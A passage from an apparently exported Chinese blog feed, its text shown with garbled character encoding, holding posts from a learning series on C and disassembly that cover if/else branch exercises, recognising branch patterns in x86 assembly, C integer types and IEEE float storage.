4</code>ï¼ˆè¿™ä¸ªè‚¯å®šæ˜¯pushè¿›æ¥äº†ä¸€ä¸ªå‚æ•°ï¼‰å°±ç­‰äº2ï¼Œä¹Ÿå°±æ˜¯2ä¸ªå‚æ•°ã€‚ä¸å…¬å¼äºŒæ£€éªŒå‘ç°æ²¡é—®é¢˜ï¼Œ<code>[ebp+0x]</code>ç±»ä¼¼çš„åªå‡ºç°ä¸€ä¸ª.</p><h2 id="åˆ†æ”¯è¯­å¥"><a href="#åˆ†æ”¯è¯­å¥" class="headerlink" title="åˆ†æ”¯è¯­å¥"></a>åˆ†æ”¯è¯­å¥</h2><h3 id="æ­£å‘ä»£ç ç»ƒä¹ "><a href="#æ­£å‘ä»£ç ç»ƒä¹ " class="headerlink" title="æ­£å‘ä»£ç ç»ƒä¹ "></a>æ­£å‘ä»£ç ç»ƒä¹ </h3><p> ç»ƒä¹ 1:å®šä¹‰4ä¸ªintç±»å‹çš„å…¨å±€å˜é‡ï¼Œåˆ†åˆ«æ˜¯g_x,g_y,g_z,g_r,ä½¿ç”¨if..else..åˆ†æ”¯è¯­å¥ï¼Œå°†æœ€å¤§çš„å€¼å­˜å‚¨åˆ°g_rä¸­ã€‚<br>    #include â€œstdafx.hâ€<br>    int g_x = 5;<br>    int g_y = 3;<br>    int g_z = 7;<br>    int g_r = 0;<br>    void getMax()<br>    {<br>        if(g_x&gt;g_y)<br>        {<br>            if (g_x&gt;g_z)<br>            {<br>                g_r=g_x;<br>            }<br>            else{<br>                    g_r=g_z;<br>                }<br>        }<br>        else if (g_y &gt; g_z)<br>        {<br>            g_r=g_y;<br>        }<br>        else g_r=g_z;<br>        printf(â€œ%d\nâ€,g_r);<br>    }<br>    int main(int argc, char* argv[])<br>    {<br>        getMax();<br>        return 0;<br>    }</p><p>ç»ƒä¹ 2:æ‰¾å‡ºæ•°ç»„é‡Œé¢æœ€å¤§çš„å€¼ï¼Œå¹¶å­˜å‚¨åˆ°å…¨å±€å˜é‡ä¸­<br>    <img src="/2019/10/23/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰/images/15719199995620.jpg" srcset="/img/loading.gif" alt="-w238"><br>    #include â€œstdafx.hâ€<br>    int a[4] = {2,5,7,9};<br>    int g_r = 0;<br>    void getMax()<br>    {<br>        if(a[0]&gt;a[1])<br>        {<br>            if (a[0]&gt;a[2])<br>            {<br>                if (a[0]&gt;a[3])<br>                {<br>                    g_r=a[0];<br>                }<br>                else g_r=a[3];<br>            }<br>            else if(a[2]&gt;a[3]){<br>                    g_r=a[2];<br>                }<br>                else g_r=a[3];<br>        }<br>        else if (a[1] &gt; a[2])<br>        {<br>            if (a[1]&gt;a[3])<br>            {<br>                g_r=a[1];<br>            }<br>            else g_r=a[3];<br>        }<br>        else if (a[2] &gt; a[3])<br>        {<br>            g_r=a[2];<br>        }<br>        else g_r=a[3];<br>        printf(â€œ%d\nâ€,g_r);<br>    }<br>    int main(int argc, char* argv[])<br>    {<br>        getMax();<br>        return 0;<br>    }</p><h4 id="æ„Ÿæ‚Ÿ"><a href="#æ„Ÿæ‚Ÿ" class="headerlink" title="æ„Ÿæ‚Ÿ"></a>æ„Ÿæ‚Ÿ</h4><p>1ï¼šåˆ†æ”¯è¯­å¥ä¸­if else,åŠå…¶ç›¸äº’å¥—ç”¨ï¼Œè¦çŸ¥é“å½“æŸä¸ªæ¡ä»¶æˆåŠŸåï¼Œæ‰§è¡Œå…¶ä¸­çš„ä»£ç ï¼Œç„¶åä»¥åäºå®ƒçš„ä»£ç éƒ½ä¸ä¼šå†è¿›è¡Œåˆ¤æ–­å’Œæ‰§è¡Œã€‚<br>2ï¼šä¸€ä¸ªifåªå¯¹åº”äºä¸€ä¸ªelseï¼Œelseåªèƒ½åœ¨ifåå‡ºç°ä¸å…¶æ­é…ä½¿ç”¨ã€‚</p><h3 id="é€†å‘åˆ†æ"><a href="#é€†å‘åˆ†æ" class="headerlink" title="é€†å‘åˆ†æ"></a>é€†å‘åˆ†æ</h3><h4 id="IFè¯­å¥é€†å‘åˆ†æ"><a href="#IFè¯­å¥é€†å‘åˆ†æ" class="headerlink" title="IFè¯­å¥é€†å‘åˆ†æ"></a>IFè¯­å¥é€†å‘åˆ†æ</h4><p>ç‰¹å¾è¯†åˆ«:é¦–å…ˆä¼šæœ‰ä¸€ä¸ªjxxæŒ‡ä»¤ç”¨äºå‘ä¸‹è·³è½¬ï¼Œä¸”è·³è½¬çš„ç›®çš„è¿‘endä¸­æ²¡æœ‰jmpæŒ‡ä»¤ã€‚æ ¹æ®ä»¥ä¸Šç‰¹å¾ï¼ŒæŠŠjxxæŒ‡ä»¤å–ååï¼Œå³å¯è¿˜åŸifè¯­å¥çš„ä»£ç ã€‚ï¼ˆ<strong>æˆ‘ä»¬è¦çŸ¥é“jccä»£ç è·³è½¬è¯­å¥ï¼Œå…¶åˆ¤æ–­æ¡ä»¶æ­£å¥½è·Ÿcçš„ifåˆ¤æ–­æ¡ä»¶æ˜¯æ­£å¥½åè¿‡æ¥çš„ã€‚</strong>ï¼‰<br><img src="/2019/10/23/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰/images/15719206938300.jpg" srcset="/img/loading.gif" alt="-w262"><br>æ±‡ç¼–ä»£ç ï¼š<br><img src="/2019/10/23/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰/images/15719208117580.jpg" srcset="/img/loading.gif" alt="-w331"><br>å¯¹äºè¿™æ®µä»£ç æˆ‘ä»¬é‡‡å–ä¸€å®šçš„åˆ†æé¡ºåºæ¥åˆ†æï¼š</p><ol><li>åˆ†æå‚æ•°ï¼š<code>[ebp+8] : X</code>        <code>[ebp+0Ch] :Y</code></li><li>åˆ†æå±€éƒ¨å˜é‡   æ— </li><li>åˆ†æå…¨å±€å˜é‡       <code>mov  dword ptr 004225c4,ecx</code></li><li>åŠŸèƒ½åˆ†æ:å°†å‚æ•°Xå­˜åˆ°åˆ°EAXä¸­ï¼Œç„¶åæ¯”è¾ƒEAX,ä¸å‚æ•°Yçš„å¤§å°.å¦‚æœX&lt;=Y é‚£ä¹ˆè·³è½¬åˆ°00401059çš„ä½ç½®,å¦åˆ™ï¼Œå°†Xçš„å€¼å­˜å‚¨åˆ°å…¨å±€å˜é‡ä¸­</li><li>è¿”å›å€¼åˆ†æ   æ— </li></ol><p>ç»ƒä¹ ï¼š<br><img src="/2019/10/23/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰/images/15719212740917.jpg" srcset="/img/loading.gif" alt="-w367"></p><ol><li>åˆ†æå‚æ•°ï¼š<code>[ebp+8] : X</code>        <code>[ebp+0Ch] :Y</code></li><li>åˆ†æå±€éƒ¨å˜é‡   <code>[ebp-4]ï¼ša</code></li><li>åˆ†æå…¨å±€å˜é‡       <code>mov         eax,[004225c4]: m</code> </li><li>åŠŸèƒ½åˆ†æ:(çœç•¥ï¼Œç›´æ¥ä»¥cè¯­è¨€ä»£ç è¡¨ç¤º)</li><li>è¿”å›å€¼åˆ†æ   æ— </li></ol><p><strong>é€†ä¸ºcå‡½æ•°</strong>ï¼š</p><pre><code>int m=1;void Funcation(int x, int y){    int a;    a=m;    if(x&lt;=y)    {        y=y+a;        m=y;    }}</code></pre><p><img src="/2019/10/23/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰/images/15719214461732.jpg" srcset="/img/loading.gif" alt></p><h4 id="IFâ€¦ELSEâ€¦è¯­å¥é€†å‘åˆ†æ"><a href="#IFâ€¦ELSEâ€¦è¯­å¥é€†å‘åˆ†æ" class="headerlink" title="IFâ€¦ELSEâ€¦è¯­å¥é€†å‘åˆ†æ"></a>IFâ€¦ELSEâ€¦è¯­å¥é€†å‘åˆ†æ</h4><p>if..eesè¯­å¥æ¯”ifè¯­å¥å¤šå‡ºäº†-ä¸€ä¸ªâ€œelseâ€ ï¼Œå½“ifè¡¨è¾¾å¼ç»“æœä¸ºçœŸæ—¶è·³è¿‡elseåˆ†æ”¯è¯­å¥å—ï¼Œå½“è¡¨è¾¾å¼ç»“æœä¸ºå‡æ—¶è·³è½¬åˆ°else åˆ†æ”¯è¯­å¥å—ä¸­ã€‚<br><img src="/2019/10/23/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰/images/15719216273356.jpg" srcset="/img/loading.gif" alt="-w226"><br>ç‰¹å¾è¯†åˆ«:é¦–å…ˆä¼šæœ‰ä¸€ä¸ªjxxæŒ‡ä»¤ç”¨äºå‘ä¸‹è·³è½¬ï¼Œä¸”è·³è½¬çš„ç›®çš„elseä¸­æœ‰çš„ä¸Šæ–¹æœ‰jmpæŒ‡ä»¤ã€‚else ä»£ç çš„ç»“å°¾æ²¡æœ‰jmpæŒ‡ä»¤ï¼Œelse çš„ä»£ç ä¹Ÿä¼šæ‰§è¡Œif _else. _end çš„ä»£ç ã€‚æ ¹æ®ä»¥ä¸Šç‰¹å¾ï¼ŒæŠŠjxxæŒ‡ä»¤å–ååï¼Œå³å¯è¿˜åŸifâ€¦eseè¯­å¥çš„ä»£ç <br><strong>æ€»ç»“ï¼šè·³è½¬æ‰§è¡Œä¸€éƒ¨åˆ†ä»£ç ï¼Œä¸è·³è½¬æ‰§è¡Œå¦å¤–ä¸€éƒ¨åˆ†ä»£ç </strong><br>æ±‡ç¼–ä»£ç ï¼š<br><img src="/2019/10/23/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰/images/15719219621907.jpg" srcset="/img/loading.gif" alt="-w369"><br>åŒæ ·å®‰è£…ä¸€å®šçš„é¡ºåºï¼š</p><p>1ï¼šåˆ†æå‚æ•°ï¼š<code>[ebp+8] : X</code>        <code>[ebp+0Ch] :Y</code><br>2ï¼šåˆ†æå±€éƒ¨å˜é‡   <code>[ebp-4] = eax = [004225c4]</code><br>3ï¼šåˆ†æå…¨å±€å˜é‡       <code>[004225c4] G</code><br>4ï¼šåŠŸèƒ½åˆ†æ:æ¯”è¾ƒXä¸Yçš„å¤§å°ï¼Œå¦‚æœX&lt;=Yé‚£ä¹ˆæ‰§è¡Œ<br><img src="/2019/10/23/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰/images/15719249677324.jpg" srcset="/img/loading.gif" alt="-w427"><br>å¦‚æœX&gt;Y é‚£ä¹ˆæ‰§è¡Œ<br><img src="/2019/10/23/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰/images/15719249899962.jpg" srcset="/img/loading.gif" alt="-w435"><br>5ï¼šè¿”å›å€¼åˆ†æ   æ— <br><strong>ç»ƒä¹ ï¼š</strong><br><img src="/2019/10/23/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰/images/15719223446828.jpg" srcset="/img/loading.gif" alt="-w382"></p><ol><li>åˆ†æå‚æ•°ï¼š<code>[ebp+8] : X</code>        <code>[ebp+0Ch] :Y</code></li><li>åˆ†æå±€éƒ¨å˜é‡   <code>[ebp-4]ï¼šeax:[004225c4]:a</code> <code>[ebp-8]:b:2</code></li><li>åˆ†æå…¨å±€å˜é‡       <code>mov         eax,[004225c4]</code> </li><li>åŠŸèƒ½åˆ†æ:(çœç•¥ï¼Œç›´æ¥ä»¥cè¯­è¨€ä»£ç è¡¨ç¤º)</li><li>è¿”å›å€¼åˆ†æ   æ— </li></ol><p><strong>è¿˜åŸæˆcå‡½æ•°ï¼š</strong></p><pre><code>int m=1;void Funcation(int x,int y){    int a,b;    a=m;    b=2;    if (x&gt;=y)    {        b=b+1;        if (x&lt;y)        {            m=b;        }else m=a+b;    }}</code></pre><p><img src="/2019/10/23/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰/images/15719224472672.jpg" srcset="/img/loading.gif" alt></p><h4 id="IFâ€¦ELSE-IFâ€¦ELSEé€†å‘åˆ†æ"><a href="#IFâ€¦ELSE-IFâ€¦ELSEé€†å‘åˆ†æ" class="headerlink" title="IFâ€¦ELSE IFâ€¦ELSEé€†å‘åˆ†æ"></a>IFâ€¦ELSE IFâ€¦ELSEé€†å‘åˆ†æ</h4><p><img src="/2019/10/23/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰/images/15719225611187.jpg" srcset="/img/loading.gif" alt="-w307"><br>ç‰¹å¾è¯†åˆ«:é¦–å…ˆä¼šæœ‰ä¸€ä¸ªjxxæŒ‡ä»¤ç”¨äºå‘ä¸‹è·³è½¬ï¼Œä¸”è·³è½¬çš„ç›®çš„else ifä¸­æœ‰jmpæŒ‡ä»¤ã€‚else ifçš„è·³è½¬ç›®çš„elseä¸­æœ‰jmpæŒ‡ä»¤ï¼Œä¸”elseç çš„ç»“å°¾æ²¡æœ‰jmpæŒ‡ä»¤ï¼Œ<strong>æ‰€æœ‰jmpçš„ç›®æ ‡åœ°å€ä¸€è‡´</strong>ã€‚æ ¹æ®ä»¥ä¸Šç‰¹å¾ï¼ŒæŠŠjxxæŒ‡ä»¤å–åï¼Œå³å¯è¿˜åŸifâ€¦else ifâ€¦.elseè¯­å¥çš„ä»£ç ã€‚<br><strong>å¦‚æœæŸä¸ªåˆ†æ”¯æ²¡æœ‰æ¡ä»¶åˆ¤æ–­ï¼Œåˆ™ä¸ºelseéƒ¨åˆ†</strong>ã€‚<br>æ±‡ç¼–ä»£ç ï¼š<br><img src="/2019/10/23/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰/images/15719226993158.jpg" srcset="/img/loading.gif" alt="-w334"><br>    å‡½æ•°å†…éƒ¨åŠŸèƒ½åˆ†æï¼š<br>    1ã€åˆ†æå‚æ•°ï¼š<code>[ebp+8]    X                        [ebp+0Ch]  Y                        [ebp+10h]  Z</code><br>    2ã€åˆ†æå±€éƒ¨å˜é‡    <code>[ebp-4] = A = 0                        [ebp-8] = B = 1                        [ebp-0Ch] = C = 2</code><br>    3ã€åˆ†æå…¨å±€å˜é‡        æ— <br>    4ã€åŠŸèƒ½åˆ†æ        </p><pre><code>if(x&gt;y)                                {                                    A = B+1;                                }                                else if(x&gt;z)                                {                                    A = C+1;                                }                                else if(x&gt;z)                                {                                    A = B+C                                }                                else                                {                                    A = B+C+1;                                }                                return A;                </code></pre><p>ç»ƒä¹ ï¼š<br><img src="/2019/10/23/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰/images/15719228667624.jpg" srcset="/img/loading.gif" alt="-w305"><br>1ã€åˆ†æå‚æ•°ï¼š<code>[ebp+8]    X                        [ebp+0Ch]  Y                        [ebp+10h]  Z</code><br>    2ã€åˆ†æå±€éƒ¨å˜é‡    <code>[ebp-4] = A                        [ebp-8] = B                        [ebp-0Ch] = C</code><br>    3ã€åˆ†æå…¨å±€å˜é‡        æ— <br>    4.è¿”å›å€¼åˆ†æ a+1<br>    è¿˜åŸæˆCå‡½æ•°ï¼š</p><pre><code>int Funcation(int x,int y,int z){    int a=0;    int b=1;    int c=2;    if (x&lt;=y)    {        a=b-1;    }    else if (y&gt;=z)    {        a=c+1;    }    else if (x&gt;z)    {        a=b+c;    }    else a=b+c-1;    return a+1;}</code></pre><p><img src="/2019/10/23/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰/images/15719229837839.jpg" srcset="/img/loading.gif" alt></p><h4 id="æ„Ÿæ‚Ÿ-1"><a href="#æ„Ÿæ‚Ÿ-1" class="headerlink" title="æ„Ÿæ‚Ÿ"></a>æ„Ÿæ‚Ÿ</h4><p>æ¯ä¸ªåˆ†æ”¯ç±»å‹éƒ½æœ‰è‡ªå·±çš„ç‰¹å¾ç‚¹ï¼Œè®°æ¸…æ¥šè¿™ä¸ªåï¼Œåˆ†æèµ·æ¥ä¼šå®¹æ˜“å¾ˆå¤šã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>cä¸æ±‡ç¼–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸‰ï¼‰</title>
    <link href="/2019/10/20/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <url>/2019/10/20/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸‰ï¼‰"><a href="#Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸‰ï¼‰" class="headerlink" title="Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸‰ï¼‰"></a>Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸‰ï¼‰</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬æ¬¡ä¸»è¦å­¦ä¹ ä¸€ä¸‹Cè¯­è¨€çš„æ•°æ®ç±»å‹ä¸æ•°æ®å­˜å‚¨ã€‚</p><h2 id="æ•°æ®ç±»å‹"><a href="#æ•°æ®ç±»å‹" class="headerlink" title="æ•°æ®ç±»å‹"></a>æ•°æ®ç±»å‹</h2><p><img src="/2019/10/20/Cè¯­è¨€å­¦ä¹ ä¸åæ±‡ç¼–ï¼ˆä¸‰ï¼‰/images/15715865045834.jpg" srcset="/img/loading.gif" alt="-w709"></p><h3 id="å­¦ä¹ æ•°æ®ç±»å‹çš„ä¸‰ä¸ªè¦ç´ "><a href="#å­¦ä¹ æ•°æ®ç±»å‹çš„ä¸‰ä¸ªè¦ç´ " class="headerlink" title="å­¦ä¹ æ•°æ®ç±»å‹çš„ä¸‰ä¸ªè¦ç´ "></a>å­¦ä¹ æ•°æ®ç±»å‹çš„ä¸‰ä¸ªè¦ç´ </h3><p>1ã€å­˜å‚¨æ•°æ®çš„å®½åº¦<br>2ã€å­˜å‚¨æ•°æ®çš„æ ¼å¼<br>3ã€ä½œç”¨èŒƒå›´(ä½œç”¨åŸŸ)<br>è¿™äº›éƒ½æ˜¯è°ˆèµ·ä¸€ä¸ªæ•°æ®ç±»å‹çš„åŸºæœ¬è¦ç´ ã€‚</p><h3 id="æ•´æ•°ç±»å‹ï¼šchar-short-int-long"><a href="#æ•´æ•°ç±»å‹ï¼šchar-short-int-long" class="headerlink" title="æ•´æ•°ç±»å‹ï¼šchar  short  int long"></a>æ•´æ•°ç±»å‹ï¼šchar  short  int long</h3><table><thead><tr><th>char</th><th>8BIT</th><th>1å­—èŠ‚</th></tr></thead><tbody><tr><td>short</td><td>16BIT</td><td>2å­—èŠ‚</td></tr><tr><td>int</td><td>32BIT</td><td>4å­—èŠ‚</td></tr><tr><td>long</td><td>32BIT</td><td>4å­—èŠ‚</td></tr></tbody></table><pre><code>char i = 0xFF;short x =0xFF;long y =0xFF;</code></pre><p>æˆ‘ä»¬æ¥çœ‹ä¸‹åœ¨æ±‡ç¼–å…¶æ˜¯ä»€ä¹ˆæ ·çš„ï¼š<br><img src="/2019/10/20/Cè¯­è¨€å­¦ä¹ ä¸åæ±‡ç¼–ï¼ˆä¸‰ï¼‰/images/15715872059570.jpg" srcset="/img/loading.gif" alt="-w505"><br>æ³¨æ„<code>byte word dword</code>çš„åŒºåˆ«ã€‚<br>ç„¶åæˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹ä»¥ä¸‹ä»£ç ï¼š</p><pre><code>char i = 0x12345678;short x = 0x12345678;long y = 0x12345678;</code></pre><p><img src="/2019/10/20/Cè¯­è¨€å­¦ä¹ ä¸åæ±‡ç¼–ï¼ˆä¸‰ï¼‰/images/15716535773728.jpg" srcset="/img/loading.gif" alt="-w639"><br>ç„¶åçœ‹åˆ°è¿˜æ˜¯<code>byte word dword</code>ï¼Œå¹¶ä¸”ä¹Ÿæ²¡æœ‰æŠ¥é”™ï¼Œä½†æ˜¯æˆ‘ä»¬è¿è¡Œä»¥åå¯ä»¥çœ‹åˆ°<br><img src="/2019/10/20/Cè¯­è¨€å­¦ä¹ ä¸åæ±‡ç¼–ï¼ˆä¸‰ï¼‰/images/15716536656301.jpg" srcset="/img/loading.gif" alt="-w1106"><br><strong>è¿™å°±è¯´æ˜ä½ å†™äº†32ä½çš„æ•°ç»™<code>char i</code>è¿™ä¸ª8ä½çš„å®¹å™¨ï¼Œè¿™æ˜¯å…è®¸çš„ï¼Œä½†æ˜¯åªèƒ½è£…ä¸‹8ä½ï¼Œå°±ä»ä½ä½å¼€å§‹æŠŠ78æ”¾å…¥ã€‚</strong></p><p>æ•´æ•°ç±»å‹åˆ†ä¸ºæœ‰ç¬¦å·(signed)å’Œæ— ç¬¦å·(unsigned)ä¸¤ç§ï¼š</p><pre><code>char i = 0xFF;unsigned char i = 0xFF;</code></pre><p>è¦çŸ¥é“å…¶åœ¨å†…å­˜é‡Œå­˜ç€æ˜¾ç¤ºçš„éƒ½æ˜¯FF<br><img src="/2019/10/20/Cè¯­è¨€å­¦ä¹ ä¸åæ±‡ç¼–ï¼ˆä¸‰ï¼‰/images/15716703064593.jpg" srcset="/img/loading.gif" alt="-w178"><br>ä½†æ˜¯è¾“å‡ºæ‰“å°å‡ºæ¥ä¸€ä¸ªæ˜¯255 ä¸€ä¸ªæ˜¯-1ï¼Œè¿™å°±æ˜¯è¯´æ˜åœ¨å†…å­˜ä¸­å­˜å‚¨çš„æ–¹å¼å®Œå…¨ä¸€æ ·ï¼Œä½†ä¼šæ ¹æ®ä½ çš„å®šä¹‰æ¥ç¡®å®å…¶æ˜¯æœ‰ç¬¦å·è¿˜æ˜¯æ— ç¬¦å·ã€‚å…¶é»˜è®¤æ˜¯æœ‰ç¬¦å·çš„ï¼Œå½“ä½ æƒ³ç”¨æ— ç¬¦å·çš„æ—¶å€™éœ€è¦ä½ æ¥å®šä¹‰ã€‚å¹¶ä¸”è¿™ä¸ªåªæœ‰åœ¨<strong>ç±»å‹è½¬æ¢å’Œå¤§å°æ¯”è¾ƒä¸­ç‰¹åˆ«æ³¨æ„</strong>ã€‚å› ä¸ºä½ ç›´æ¥å®šä¹‰ä¸ªæ— ç¬¦å·æ•°ï¼Œå…¶åœ¨å†…å­˜æ”¾çš„æ˜¯å’ŒåŸæ¥æœ‰ç¬¦å·æ•°ä¸€æ ·çš„ï¼Œåªæ˜¯ä½ åœ¨æ¯”è¾ƒæ—¶ç¼–è¯‘å™¨åœ¨ç¼–è¯‘çš„æ—¶å€™ï¼Œ<strong>ä¼šæŠŠå…¶ä¼šæŠŠæ±‡ç¼–ä»£ç è·³è½¬é‚£é‡Œæ”¹æˆç‰¹å®šå¯¹åº”çš„JCCä»£ç </strong>ï¼ˆåªè¦é’ˆå¯¹æ— ç¬¦å·ï¼Œå› ä¸ºé»˜è®¤æ˜¯æœ‰ç¬¦å·çš„ï¼‰ã€‚<br>ä¾‹å­ï¼š<br>æ— ç¬¦å·æ•°æ¯”è¾ƒï¼Œjccæ˜¯JBEï¼ŒåŸæ¥æ²¡æœ‰æŒ‡å®šæ˜¯æ— ç¬¦å·æ—¶ï¼Œå…¶æ˜¯JLEï¼ˆæœ‰ç¬¦å·ï¼‰<br><img src="/2019/10/20/Cè¯­è¨€å­¦ä¹ ä¸åæ±‡ç¼–ï¼ˆä¸‰ï¼‰/images/15716712689830.jpg" srcset="/img/loading.gif" alt="-w533"><br>æ€»ç»“ï¼š1ï¼šåœ¨å†…å­˜ä¸­å­˜å‚¨çš„æ–¹å¼å®Œå…¨ä¸€æ · ã€‚<br>        2ï¼šåœ¨ç±»å‹è½¬æ¢å’Œå¤§å°æ¯”è¾ƒä¸­ç‰¹åˆ«æ³¨æ„ï¼ˆè¿ç®—ï¼‰ã€‚</p><h3 id="æµ®ç‚¹ç±»å‹ï¼šfloat-double"><a href="#æµ®ç‚¹ç±»å‹ï¼šfloat-double" class="headerlink" title="æµ®ç‚¹ç±»å‹ï¼šfloat double"></a>æµ®ç‚¹ç±»å‹ï¼šfloat double</h3><p>floatå’Œdoubleåœ¨å­˜å‚¨æ–¹å¼ä¸Šéƒ½æ˜¯éµä»IEEEçš„è§„èŒƒçš„<br>floatçš„å­˜å‚¨æ–¹å¼å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="/2019/10/20/Cè¯­è¨€å­¦ä¹ ä¸åæ±‡ç¼–ï¼ˆä¸‰ï¼‰/images/15716717408638.jpg" srcset="/img/loading.gif" alt="-w619"><br>doubleçš„å­˜å‚¨æ–¹å¼å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="/2019/10/20/Cè¯­è¨€å­¦ä¹ ä¸åæ±‡ç¼–ï¼ˆä¸‰ï¼‰/images/15716718171405.jpg" srcset="/img/loading.gif" alt="-w729"></p><h4 id="å°†ä¸€ä¸ªfloatå‹è½¬åŒ–ä¸ºå†…å­˜å­˜å‚¨æ ¼å¼çš„æ­¥éª¤ä¸º"><a href="#å°†ä¸€ä¸ªfloatå‹è½¬åŒ–ä¸ºå†…å­˜å­˜å‚¨æ ¼å¼çš„æ­¥éª¤ä¸º" class="headerlink" title="å°†ä¸€ä¸ªfloatå‹è½¬åŒ–ä¸ºå†…å­˜å­˜å‚¨æ ¼å¼çš„æ­¥éª¤ä¸º:"></a>å°†ä¸€ä¸ªfloatå‹è½¬åŒ–ä¸ºå†…å­˜å­˜å‚¨æ ¼å¼çš„æ­¥éª¤ä¸º:</h4><ol><li>å…ˆå°†è¿™ä¸ªå®æ•°çš„ç»å¯¹å€¼åŒ–ä¸ºäºŒè¿›åˆ¶æ ¼å¼</li><li>å°†è¿™ä¸ªäºŒè¿›åˆ¶æ ¼å¼å®æ•°çš„å°æ•°ç‚¹å·¦ç§»æˆ–å³ç§»nä½ï¼Œç›´åˆ°å°æ•°ç‚¹ç§»åŠ¨åˆ°ç¬¬ä¸€ä¸ªæœ‰ æ•ˆæ•°å­—çš„å³è¾¹ã€‚</li><li>ä»å°æ•°ç‚¹å³è¾¹ç¬¬ä¸€ä¸€ä½å¼€å§‹æ•°å‡ºäºŒåä¸‰ä½æ•°å­—æ”¾å…¥ç¬¬22åˆ°ç¬¬0ä½ã€‚</li><li>å¦‚æœå®æ•°æ˜¯æ­£çš„ï¼Œåˆ™åœ¨ç¬¬31ä½æ”¾å…¥â€œ0â€ï¼Œå¦åˆ™æ”¾å…¥â€œ1â€ã€‚</li><li>å¦‚æœnæ˜¯å·¦ç§»å¾—åˆ°çš„ï¼Œè¯´æ˜æŒ‡æ•°æ˜¯æ­£çš„ï¼Œç¬¬30ä½æ”¾å…¥â€œ1â€ã€‚å¦‚æœnæ˜¯å³ç§»å¾—åˆ°çš„æˆ–n=0ï¼Œåˆ™ç¬¬30ä½æ”¾å…¥â€œ0â€ã€‚</li><li>å¦‚æœnæ˜¯å·¦ç§»å¾—åˆ°çš„ï¼Œåˆ™å°†nå‡å»1ååŒ–ä¸ºäºŒè¿›åˆ¶ï¼Œå¹¶åœ¨å·¦è¾¹åŠ â€œ0â€è¡¥è¶³ä¸ƒä½ï¼Œæ”¾å…¥ç¬¬29åˆ°ç¬¬23ä½ã€‚</li><li>å¦‚æœnæ˜¯å³ç§»å¾—åˆ°çš„æˆ–n=0ï¼Œåˆ™å°†nåŒ–ä¸ºäºŒè¿›åˆ¶ååœ¨å·¦è¾¹åŠ â€œ0â€™è¡¥è¶³ä¸ƒä½ï¼Œå†å„ä½æ±‚åï¼Œå†æ”¾å…¥ç¬¬29åˆ°ç¬¬23ä½ã€‚</li></ol><p>è¿™æ˜¯å®˜æ–¹è§£é‡Šã€‚æœ‰ç‚¹éº»çƒ¦ã€‚å…ˆç»ƒä¹ ä¸€ä¸ªï¼š<br>8.25è½¬æˆæµ®ç‚¹å­˜å‚¨<br><img src="/2019/10/20/Cè¯­è¨€å­¦ä¹ ä¸åæ±‡ç¼–ï¼ˆä¸‰ï¼‰/images/15716720748599.jpg" srcset="/img/loading.gif" alt="-w271"><br><img src="/2019/10/20/Cè¯­è¨€å­¦ä¹ ä¸åæ±‡ç¼–ï¼ˆä¸‰ï¼‰/images/15716720864148.jpg" srcset="/img/loading.gif" alt="-w229"><br>æ‰€ä»¥8.25ç”¨äºŒè¿›åˆ¶è¡¨ç¤ºå¯è¡¨ç¤ºä¸º1000.01ï¼Œç§‘å­¦è®¡æ•°æ³•è¡¨ç¤ºä¸€ä¸‹ï¼š1.00001X2^3<br>å°æ•°ç‚¹å‘å·¦ç§»åŠ¨3ä½ æŒ‡æ•°ä¸º3ï¼Œç„¶åæŒ‰ç…§ä¸Šé¢å…ˆæ”¾ç¬¬ä¸€ä¸ªç©ºæ ¼0ï¼ˆå› ä¸ºæ˜¯æ­£æ•°ï¼‰ï¼Œæ¥ç€æ”¾æœ€åä¸€ä¸ªå¤§æ ¼å­00001ï¼ˆç§‘å­¦è®¡æ•°æ³•è¡¨ç¤ºåä»å°æ•°ç‚¹åï¼‰ï¼Œç„¶åä¸­é—´æ ¼å­ç¬¬ä¸€ä½1ï¼ˆå› 